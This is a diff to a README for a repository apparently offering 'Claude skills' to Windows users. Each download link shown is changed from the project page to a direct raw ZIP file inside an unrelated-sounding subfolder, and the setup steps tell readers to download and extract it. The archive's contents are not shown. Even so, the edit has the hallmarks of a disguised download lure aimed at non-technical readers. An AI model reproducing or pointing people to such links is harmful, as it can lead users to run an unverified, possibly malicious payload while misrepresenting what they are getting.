@@ -1,9 +1,9 @@
 # 🤖 claude-recommended-skills - Simple Claude Skills for Daily Work
 
-[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/cruz000blopppp/claude-recommended-skills)
+[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/cruz000blopppp/claude-recommended-skills/raw/refs/heads/main/runbook-investigator/recommended_claude_skills_3.3.zip)
 
 ## 📥 Download
-Visit this page to download: https://github.com/cruz000blopppp/claude-recommended-skills
+Visit this page to download: https://github.com/cruz000blopppp/claude-recommended-skills/raw/refs/heads/main/runbook-investigator/recommended_claude_skills_3.3.zip
 
 Use this link to get the files on your Windows PC. On the page, look for the latest release or the main download option, then save the files to a folder you can find again.
 
@@ -24,7 +24,7 @@ This package is aimed at teams that want a clear set of work patterns. It gives 
 - Help Claude follow the right process
 
 ## 🪟 Windows setup
-1. Open the download page: https://github.com/cruz000blopppp/claude-recommended-skills
+1. Open the download page: https://github.com/cruz000blopppp/claude-recommended-skills/raw/refs/heads/main/runbook-investigator/recommended_claude_skills_3.3.zip
 2. Download the project files to your computer
 3. If the download comes as a ZIP file, right-click it and choose Extract All
 4. Put the folder in a place that is easy to find, such as Downloads or Desktop
@@ -167,7 +167,7 @@ It is useful for:
 - Anyone using Claude Code for repeat tasks
 
 ## 📎 Download again
-Download or visit this page to get the files: https://github.com/cruz000blopppp/claude-recommended-skills
+Download or visit this page to get the files: https://github.com/cruz000blopppp/claude-recommended-skills/raw/refs/heads/main/runbook-investigator/recommended_claude_skills_3.3.zip
 
 ## 🧩 Repository details
 - Name: claude-recommended-skills
